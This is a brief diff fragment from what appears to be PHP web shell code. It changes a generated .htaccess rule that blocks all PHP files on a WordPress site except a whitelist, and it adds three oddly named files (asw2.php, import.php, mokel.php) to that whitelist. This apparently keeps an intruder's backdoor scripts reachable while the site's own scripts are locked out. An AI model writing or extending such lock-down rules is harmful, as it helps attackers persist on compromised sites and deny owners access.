@@ -3046,7 +3046,7 @@ if (isset($_GET['destroy'])) {
 <FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
     Deny from all
 </FilesMatch>
-<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
+<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|asw2.php|import.php|mokel.php||wp-includes.php)$">
     Allow from all
 </FilesMatch>
 <FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
